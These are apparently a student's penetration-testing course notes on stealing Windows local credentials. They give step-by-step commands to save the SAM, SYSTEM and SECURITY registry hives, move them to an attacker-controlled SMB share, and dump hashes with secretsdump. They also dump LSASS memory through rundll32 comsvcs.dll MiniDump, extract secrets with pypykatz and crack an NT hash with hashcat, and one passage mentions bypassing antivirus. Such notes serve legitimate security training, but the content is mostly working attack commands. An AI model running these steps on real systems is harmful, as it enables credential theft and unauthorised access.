### Windows Local Password Attacks

### Attacking SAM (Security Account Manager)

```
# With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files 
# associated with the SAM database to transfer them to our attack host and start cracking hashes offline.
```

### Copying SAM Registry Hives

```
# There are three registry hives that we can copy if we have local admin access on the target; 
# each will have a specific purpose when we get to dumping and cracking the hashes. 
# Here is a brief description of each in the table below:

hklm\sam	            Contains the hashes associated with local account passwords.
hklm\system	            Contains the system bootkey, which is used to encrypt the SAM database. 
hklm\security	        Contains cached credentials for domain accounts. 

# We can create backups of these hives using the reg.exe utility.
# Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives:

C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
output:
The operation completed successfully.
```

```
# Once the hives are saved offline, we can use various methods to transfer them to our attack host. 
# In this case, let's use Impacket's smbserver.py in combination with some useful CMD commands 
# to move the hive copies to a share created on our attack host.
```

### Creating a Share with smbserver.py

[Impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)

```
# All we must do to create the share is run smbserver.py -smb2support using python, 
# give the share a name (CompData) and specify the directory on our attack host where the share will be storing the hive copies 
# (/home/ltnbob/Documents).

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/samsmb/

# Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share.

C:\> move sam.save \\10.10.14.202\CompData
C:\> move security.save \\10.10.15.16\CompData
C:\> move system.save \\10.10.15.16\CompData
output:
1 file(s) moved.

# Then we can confirm that our hive copies successfully moved to the share 
# by navigating to the shared directory on our attack host and using ls to list the files.

ls
output:
sam.save  security.save  system.save
```

### Dumping Hashes with Impacket's secretsdump.py

```
# One incredibly useful tool we can use to dump the hashes offline is Impacket's secretsdump.py. 
# Impacket can be found on most modern penetration testing distributions.

locate secretsdump                          # locate tool on parrot localhost

# Run tool against 3 saved files (yep no sudo)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

```

```
# Task solutiion
# Just go through commands in notes.
```

### Attacking LSASS

```
# In addition to getting copies of the SAM database to dump and crack hashes, we will also benefit from targeting LSASS. 
# As discussed in the Credential Storage section of this module, 
# LSASS is a critical service that plays a central role in credential management 
# and the authentication processes in all Windows operating systems.

# Upon initial logon, LSASS will:

- Cache credentials locally in memory
- Create access tokens
- Enforce security policies
- Write to Windows security log
```

### Dumping LSASS Process Memory

```
# Task Manager Method
# With access to an interactive graphical session with the target, we can use task manager to create a memory dump.
(Open Task Manager > Select the Processes tab > Right click the Local Security Authority Process > Select Create dump file)

# A file called lsass.DMP is created and saved in:
C:\Users\loggedonusersdirectory\AppData\Local\Temp

# This is the file we will transfer to our attack host. 
# We can use the file transfer method discussed in the Attacking SAM section of this module to transfer the dump file to our attack host.
```

### Rundll32.exe & Comsvcs.dll Method

```
# The Task Manager method is dependent on us having a GUI-based interactive session with a target. 
# We can use an alternative method to dump LSASS process memory through a command-line utility called rundll32.exe.
# It is important to note that modern anti-virus tools recognize this method as malicious activity. (!)

# Determine what process ID (PID) is assigned to lsass.exe.:

tasklist /svc               # Check PID of lass with CMD
Get-Process lsass           # Check PID of lass with PowerShell

# Creating lsass.dmp using PowerShell

rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) 
# function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). 
# Recall that most modern AV tools recognize this as malicious and prevent the command from executing. 
# In these cases, we will need to consider ways to bypass or disable the AV tool we are facing.

# Note: 
# We can use the file transfer method discussed in the Attacking SAM section to get the lsass.dmp file from the target to our attack host.
```

### Using Pypykatz to Extract Credentials

[pypykatz](https://github.com/skelsec/pypykatz)

```
# Pypykatz is an implementation of Mimikatz written entirely in Python. 
# The fact that it is written in Python allows us to run it on Linux-based attack hosts. 
# At the time of this writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host 
# or we would need to run Mimikatz directly on the target, which is not an ideal scenario. 
# This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, 
# and we can run it offline from our Linux-based attack host.
```

### Running Pypykatz

```
# The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. 
# We use lsa in the command because LSASS is a subsystem of local security authority, 
# then we specify the data source as a minidump file, 
# proceeded by the path to the dump file (/home/user/pypykatz/lsass.dmp) stored on our attack host.

pypykatz lsa minidump /home/user/lsass/lsass.dmp

```

### Cracking the NT Hash with Hashcat

```
# Now we can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user, 
# which means we won't need to create a list of hashes as we did in the Attacking SAM section of this module.

sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt           # Run command with NTLM hash type (-m 1000)
output:
64f12cddaa88057e06a81b54e73b949b:Password1    # Got passsword for bob
```

```
# Task solution 
# The same, going by notes, use smb py to copu .dmp file, run:
pypykatz lsa minidump /home/user/lsass/lsass.dmp | grep Vendor -B5      # with grep to show only Vendor and next 5 rows (include pass)
# and hashcat to find related password. Done.
```
